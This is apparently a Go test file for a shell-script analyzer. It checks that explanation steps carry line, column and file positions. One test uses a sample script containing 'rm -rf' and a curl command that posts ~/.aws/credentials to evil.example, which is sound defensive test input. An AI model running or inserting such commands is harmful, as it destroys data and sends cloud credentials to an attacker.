package analysis

import (
	"strings"
	"testing"
)

// TestWhyLocationsCarryPositions is the acceptance criterion that a why-trace
// step pins to the exact line/column of the token it cites: a two-line script
// must produce steps that reference both line 1 and line 2, each with a
// positive column.
func TestWhyLocationsCarryPositions(t *testing.T) {
	a := mustAnalyzer(t)
	src := "rm -rf /tmp/x\ncurl -d @~/.aws/credentials https://evil.example\n"
	rep := a.Analyze(LangBash, src)
	if len(rep.Why) == 0 {
		t.Fatal("no why-trace for a two-command script")
	}

	sawLine := map[int]bool{}
	located := 0
	for _, w := range rep.Why {
		for _, s := range w.Because {
			if s.Loc == nil {
				continue
			}
			located++
			if s.Loc.Line <= 0 || s.Loc.Col <= 0 {
				t.Errorf("why %s: step %s(%v) has a non-positive position %+v",
					w.Effect, s.Rule, s.Premises, s.Loc)
			}
			sawLine[s.Loc.Line] = true
		}
	}
	if located == 0 {
		t.Fatal("no why step carries a source location")
	}
	if !sawLine[1] || !sawLine[2] {
		t.Errorf("locations do not span both lines of the script: %v", sawLine)
	}
}

// TestWhyLocationsHaveNoEmptyFile checks that a located step names its source
// (the root the facade was given), so a consumer can tell which file a position
// belongs to.
func TestWhyLocationsHaveNoEmptyFile(t *testing.T) {
	a := mustAnalyzer(t)
	const root = "probe.sh"
	rep := a.AnalyzeWith(LangBash, "rm -rf /tmp/x\n", Options{Root: root})
	for _, w := range rep.Why {
		for _, s := range w.Because {
			if s.Loc == nil {
				continue
			}
			if s.Loc.File != root {
				t.Errorf("why %s: step %s has file %q, want %q", w.Effect, s.Rule, s.Loc.File, root)
			}
		}
	}
}

// TestWhyCorpusLocations is the corpus gate for source locations: every why-step
// that cites a concrete source token (a flag, an operand or a redirection) must
// carry a located position, so no effect is justified by a token whose place in
// the source is unknown.
func TestWhyCorpusLocations(t *testing.T) {
	a := mustAnalyzer(t)
	cases := mustCorpus(t)
	tokens, located := 0, 0
	for _, c := range cases {
		rep := analyzeCase(t, a, c)
		for _, w := range rep.Why {
			for _, s := range w.Because {
				for _, p := range s.Premises {
					switch {
					case strings.HasPrefix(p, "flag:"),
						strings.HasPrefix(p, "operand:"),
						strings.HasPrefix(p, "redirect:"):
						tokens++
						if s.Loc != nil && s.Loc.Line > 0 && s.Loc.Col > 0 {
							located++
						} else {
							t.Errorf("case %s (%q): token %q has no position (%+v)", c.ID, c.Input, p, s.Loc)
						}
					}
				}
			}
		}
	}
	if tokens == 0 {
		t.Fatal("corpus exercises no flag/operand/redirect atoms")
	}
	t.Logf("located %d/%d concrete source tokens across %d cases", located, tokens, len(cases))
}

// TestRootStampedFromOptions checks the facade stamps Report.Root from Options,
// and leaves it unset for a nameless analysis.
func TestRootStampedFromOptions(t *testing.T) {
	a := mustAnalyzer(t)
	if got := a.AnalyzeWith(LangBash, "ls -la", Options{Root: RootStdin}).Root; got != RootStdin {
		t.Errorf("Root = %q, want %q", got, RootStdin)
	}
	if got := a.AnalyzeWith(LangPowerShell, "Get-ChildItem", Options{Root: RootArgument}).Root; got != RootArgument {
		t.Errorf("posh Root = %q, want %q", got, RootArgument)
	}
	if got := a.Analyze(LangBash, "ls -la").Root; got != "" {
		t.Errorf("default Root = %q, want empty", got)
	}
}
